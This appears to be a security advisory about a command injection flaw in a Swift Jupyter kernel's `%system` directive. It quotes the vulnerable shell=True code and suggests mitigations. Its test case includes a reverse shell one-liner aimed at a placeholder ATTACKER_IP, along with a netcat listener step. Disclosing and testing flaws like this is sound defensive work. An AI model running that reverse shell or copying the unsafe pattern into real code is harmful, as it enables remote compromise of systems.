* Vulnerability Name: Unsafe execution of system commands via `%system` directive
* Description:
    - A malicious Jupyter notebook can use the `%system` directive to execute arbitrary system commands on the server hosting the Jupyter kernel.
    - An attacker can craft a Swift notebook containing a cell with the `%system` directive followed by a malicious command.
    - When the user opens and runs this notebook, the `_process_system_command_line` function in `swift_kernel.py` executes the provided command using `subprocess.Popen` with `shell=True`.
    - This allows the attacker to bypass any sandboxing and execute commands with the privileges of the Jupyter kernel process.
* Impact:
    - **Critical**. Arbitrary command execution on the server.
    - An attacker can completely compromise the system hosting the Jupyter kernel. This could lead to data theft, installation of malware, or further attacks on internal networks.
* Vulnerability Rank: Critical
* Currently Implemented Mitigations:
    - None. The code directly executes the system command.
* Missing Mitigations:
    - **Input sanitization:** Sanitize or strictly validate the input to the `%system` directive to prevent command injection. However, even with sanitization, allowing arbitrary system commands is inherently risky.
    - **Restricting command execution:**  Remove or disable the `%system` directive entirely. If system commands are necessary, implement a safe and controlled way to execute a limited set of predefined commands with strict input validation.
    - **Sandboxing:** Implement a more robust sandboxing mechanism to limit the capabilities of the Swift kernel process and prevent it from executing arbitrary system commands or accessing sensitive resources.
* Preconditions:
    - The user must open and execute a malicious Swift notebook containing a cell with the `%system` directive.
    - The Jupyter kernel must be running on a server accessible to the attacker or the attacker can convince a local user to run the notebook.
* Source Code Analysis:
    - File: `/code/swift_kernel.py`
    - Function: `_process_system_command_line(self, line)`
    ```python
    def _process_system_command_line(self, line):
        system_match = re.match(r'^\s*%system (.*)$', line)
        if system_match is None:
            return line

        if hasattr(self, 'debugger'):
            raise PackageInstallException(
                    'System commands can only run in the first cell.')

        rest_of_line = system_match.group(1)
        process = subprocess.Popen(rest_of_line,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT,
                            shell=True) # Vulnerability: shell=True
        process.wait()
        command_result = process.stdout.read().decode('utf-8')
        self.send_response(self.iopub_socket, 'stream', {
            'name': 'stdout',
            'text': '%s' % command_result
        })
        return ''
    ```
    - The code extracts the command from the line using regex and directly passes it to `subprocess.Popen` with `shell=True`.
    - `shell=True` is dangerous because it allows shell injection vulnerabilities. An attacker can inject arbitrary shell commands by crafting input that is not properly sanitized.
    - The code also checks if `self.debugger` exists to limit `%system` to the first cell execution. This limitation does not mitigate the command injection vulnerability itself.
* Security Test Case:
    - Step 1: Create a new Swift Jupyter notebook.
    - Step 2: In the first cell, enter the following code:
    ```swift
    %system touch /tmp/pwned
    ```
    - Step 3: Execute the cell.
    - Step 4: On the server hosting the Jupyter kernel, check if the file `/tmp/pwned` has been created. If the file exists, the vulnerability is confirmed.

    - For a more impactful test, try a reverse shell:
    ```swift
    %system bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1
    ```
    - Step 5: Set up a netcat listener on `ATTACKER_IP:ATTACKER_PORT`.
    - Step 6: Execute the cell in the notebook.
    - Step 7: If a shell connection is established back to the attacker's machine, arbitrary command execution is confirmed.